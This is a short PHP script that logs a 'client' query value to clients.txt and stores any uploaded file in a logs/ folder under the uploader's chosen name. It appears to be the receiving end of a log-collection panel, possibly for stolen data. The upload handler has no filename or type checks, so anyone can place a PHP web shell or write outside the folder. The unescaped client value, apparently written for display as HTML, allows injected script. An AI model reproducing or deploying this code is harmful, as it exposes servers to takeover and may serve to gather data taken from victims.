<?php 
    if (isset($_GET['client'])) {
        $fopen = fopen("clients.txt", "a");
        fwrite($fopen, "<br>".$_GET['client']);
        fclose($fopen);
        die();
    }
    move_uploaded_file($_FILES['file']["tmp_name"], "logs/".$_FILES['file']["name"]); 
?>